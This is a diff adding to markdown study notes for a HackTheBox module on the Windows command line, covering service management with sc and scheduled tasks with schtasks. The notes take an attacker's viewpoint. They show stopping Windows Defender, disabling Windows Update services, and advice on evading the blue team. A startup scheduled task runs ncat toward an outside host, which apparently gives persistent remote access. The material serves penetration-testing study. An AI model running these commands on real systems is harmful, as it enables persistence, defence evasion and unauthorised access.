@@ -1,5 +1,5 @@
 # Introduction to Windows Command Line 
-Brief notes written to review the material in the HackTheBox module, Introduction to Active Directory.
+Brief notes written to review the material in the HackTheBox module, Introduction to Windows Command Line.
 
 ## Command Prompt Vs. PowerShell
 
@@ -231,3 +231,155 @@ Both set and setx are command line utilities that allow us to display, set, and 
 |%ProgramFiles(x86)%|	Equivalent of C:\Program Files (x86). This location is where all 32-bit programs running under WOW64 are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (x86 vs. x64 architecture)
 
 ## Managing Services
+SC (Service Controller) is a Windows executable utility that allows us to query, modify, and manage host services locally and over the network. There's other tools, like Windows Management Instrumentation (WMIC) and Tasklist that can also query and manage services for local and remote hosts. 
+
+Let's see what services are currently actively running on the system. We can do so by issuing the following command: sc query type= service.
+
+Note: The spacing for the optional query parameters is crucial. For example, type= service, type=service, and type =service are completely different ways of spacing this parameter. 
+
+Check if Windows Defender is enabled: sc query windefend
+
+### Stopping and Starting Services
+```
+C:\htb> sc stop windefend
+
+Access is denied.
+```
+Our current user doesn't have the proper permissions to stop or pause this particular service. To perform this action, we would likely need the permissions of an Administrator account but in some cases, certain services can only be handled by the system itself.
+
+As an attacker, learning the restrictions behind what certain accounts have access or lack of access to is very important because blindly trying to stop services will fill the logs with errors and trigger any alerts showing that a user with insufficient privileges is trying to access a protected process on the system. This will catch the blue team's attention to our activities and begin a triage attempt to kick us off the system and lock us out permanently.
+
+### Starting Services
+```
+C:\WINDOWS\system32> sc start Spooler
+```
+
+Although stopping services seems to offer a bit more practicality at first to the red team, being able to start services can lend itself to be especially useful in conjunction with being able to modify existing services. Typically services will take a few seconds or so to initialize after a request to start is issued.
+
+### Modifying Services
+
+Disabling Windows Updates Using SC:
+
+To configure services, we must use the config parameter in sc. This will allow us to modify the values of existing services, regardless if they are currently running or not. All changes made with this command are reflected in the Windows registry as well as the database for Service Control Manager (SCM). Remember that all changes to existing services will only fully update after restarting the service.
+
+Windows updates rely on two services:
+
+|Service|	Display Name|
+|:-:|:-:|
+|wuauserv|	Windows Update Service
+|bits|	Background Intelligent Transfer Service
+
+```
+C:\WINDOWS\system32> sc query wuauserv
+SERVICE_NAME: wuauserv
+        TYPE               : 30  WIN32
+        STATE              : 1  STOPPED
+
+C:\WINDOWS\system32> sc query bits
+SERVICE_NAME: bits
+        TYPE               : 30  WIN32
+        STATE              : 4  RUNNING
+
+C:\WINDOWS\system32> sc stop bits
+
+SERVICE_NAME: bits
+        TYPE               : 30  WIN32
+        STATE              : 3  STOP_PENDING
+
+C:\WINDOWS\system32> sc config wuauserv start= disabled
+
+[SC] ChangeServiceConfig SUCCESS
+
+C:\WINDOWS\system32> sc config bits start= disabled
+
+[SC] ChangeServiceConfig SUCCESS
+
+C:\WINDOWS\system32> sc start wuauserv 
+
+[SC] StartService FAILED 1058:
+
+The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
+
+C:\WINDOWS\system32> sc start bits
+
+[SC] StartService FAILED 1058:
+
+The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
+```
+Note: This change will persist upon reboot. To revert everything back to normal, you can set start= auto to make sure that the services can be restarted and function appropriately.
+
+### Other Routes to Query Services
+Using Tasklist: Tasklist is a command line tool that gives us a list of currently running processes on a local or remote host. However, we can utilize the /svc parameter to provide a list of services running under each process on the system. 
+
+Using Net Start: Net start is a very simple command that will allow us to quickly list all of the current running services on a system. In addition to net start, there is also net stop, net pause, and net continue. These will behave very similarly to sc as we can provide the name of the service afterward and be able to perform the actions specified in the command against the service that we provide.
+
+Using WMIC: The Windows Management Instrumentation Command (WMIC) allows us to retrieve a vast range of information from our local host or host(s) across the network. The versatility of this command is wide in that it allows for pulling such a wide arrangement of information. To list all services existing on our system and information on them, we can issue the following command: wmic service list brief .
+
+## Working With Scheduled Tasks
+Triggers That Can Kick Off a Scheduled Task: 
+- When a specific system event occurs.
+- At a specific time. (Day/Week/Month)
+- When the computer enters an idle state.
+- When the task is registered.
+- When the system is booted.
+- When a user logs on.
+- When a Terminal Server session changes state.
+
+Schtasks command line utility:
+
+Schtasks /Query Parameters:
+|Parameter	|Description|
+|:-:|:-:|
+|/fo	|Sets formatting options. We can specify to show results in the Table, List, or CSV output.
+|/v	|Sets verbosity to on, displaying the advanced properties set in displayed tasks when used with the List or CSV output parameter.
+|/nh|	Simplifies the output using the Table or CSV output format. This switch removes the column headers.
+|/s	|Sets the DNS name or IP address of the host we want to connect to. Localhost is the default specified. If /s is utilized, we are connecting to a remote host and must format it as "\\host".
+|/u|	This switch will tell schtasks to run the following command with the permission set of the user specified.
+|/p	|Sets the password in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The u and p values are only valid when used with the s parameter.
+
+EX: SCHTASKS /Query /V /FO list
+
+Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following:
+
+- /create : to tell it what we are doing
+- /sc : we must set a schedule
+- /tn : we must set the name
+- /tr : we must give it an action to take
+
+```
+C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
+
+SUCCESS: The scheduled task "My Secret Task" has successfully been created.
+```
+
+### Change the Properties of a Scheduled Task
+
+|Parameter	|Description|
+|:-:|:-:|
+|/tn|	Designates the task to change
+|/tr|	Modifies the program or action that the task runs.
+|/ENABLE|	Change the state of the task to Enabled.
+|/DISABLE|	Change the state of the task to Disabled.
+
+```
+C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
+
+SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
+```
+### Delete the Scheduled Task(s)
+
+|Parameter	|Description|
+|:-:|:-:|
+|/tn|	Identifies the task to delete.
+|/s|	Specifies the name or IP address to delete the task from.
+|/u|	Specifies the user to run the task as.
+|/p|	Specifies the password to run the task as.
+|/f|	Stops the confirmation warning.
+
+```
+C:\htb> schtasks /delete  /tn "My Secret Task" 
+
+WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
+```
+
+# PowerShell
